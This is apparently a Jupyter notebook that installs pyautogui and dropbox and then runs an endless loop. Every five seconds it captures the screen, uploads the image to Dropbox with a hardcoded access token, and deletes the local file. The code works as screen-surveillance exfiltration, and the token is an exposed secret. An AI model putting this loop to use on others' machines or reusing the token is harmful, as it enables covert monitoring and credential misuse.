# %%
pip install pyautogui
# Out:
# ...
#      ---------------------------------------- 0.0/61.2 kB ? eta -:--:--
#      ------ --------------------------------- 10.2/61.2 kB ? eta -:--:--
#      ------------------- ------------------ 30.7/61.2 kB 217.9 kB/s eta 0:00:01
#      ------------------------- ------------ 41.0/61.2 kB 279.3 kB/s eta 0:00:01
#      -------------------------------------- 61.2/61.2 kB 296.5 kB/s eta 0:00:00
#   Installing build dependencies: started
#   Installing build dependencies: finished with status 'done'
#   Getting requirements to build wheel: started
#   Getting requirements to build wheel: finished with status 'done'
#   Preparing metadata (pyproject.toml): started
#   Preparing metadata (pyproject.toml): finished with status 'done'
# ...
#   Installing build dependencies: started
#   Installing build dependencies: finished with status 'done'
#   Getting requirements to build wheel: started
#   Getting requirements to build wheel: finished with status 'done'
# ...

# %%
pip install dropbox
# Out:
# ...
#
#   Obtaining dependency information for dropbox from https://files.pythonhosted.org/packages/86/96/1cd39be567d8e361fc06a4135e40ddbf1410f99524771a7f3e5807a26a35/dropbox-11.36.2-py3-none-any.whl.metadata
# ...
#      ---------------------------------------- 0.0/162.3 kB ? eta -:--:--
#      ---------------------------------------- 0.0/162.3 kB ? eta -:--:--
#      -- ------------------------------------- 10.2/162.3 kB ? eta -:--:--
#      ------- ----------------------------- 30.7/162.3 kB 330.3 kB/s eta 0:00:01
#      -------------- ---------------------- 61.4/162.3 kB 409.6 kB/s eta 0:00:01
#      ------------------------------- ---- 143.4/162.3 kB 778.5 kB/s eta 0:00:01
#      ---------------------------------- - 153.6/162.3 kB 766.6 kB/s eta 0:00:01
#      ------------------------------------ 162.3/162.3 kB 697.3 kB/s eta 0:00:00
# ...
#    ---------------------------------------- 0.0/594.0 kB ? eta -:--:--
#    ------- -------------------------------- 112.6/594.0 kB 6.8 MB/s eta 0:00:01
# ...

# %%
import pyautogui
import datetime
import dropbox
import os
import time

ACCESS_TOKEN = 'sl.BvbKcXAZTp4G0yVJBE4kcjsS6IflMmQ2W0ehDXEEpoxf9csHz94pYDAa7IU9xDBKvpKf3mfOgyELR13kbBHWJ3eQ07lMDXIravcxMVj4iVbegZ1bMXLapFpQ0FCvjnhrtAabofZadyyqKl9u7ptm'

def take_screenshot():
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d_%H_%M-%S")
    screenshot_file= f"screenshot_{timestamp}.png"
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_file)
    return screenshot_file


def upload_to_dropbox(file_path):
    dbx = dropbox.Dropbox(ACCESS_TOKEN)
    
    with open(file_path,'rb') as f:
        dbx.files_upload(f.read(),f"/{file_path}")
        
    print("файл успешно загружен в Dropbox!")
    
while(True):   
    
    screenshot_file = take_screenshot()

    upload_to_dropbox(screenshot_file)

    os.remove(screenshot_file)

    time.sleep(5)
# Out:
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# файл успешно загружен в Dropbox!
# ...
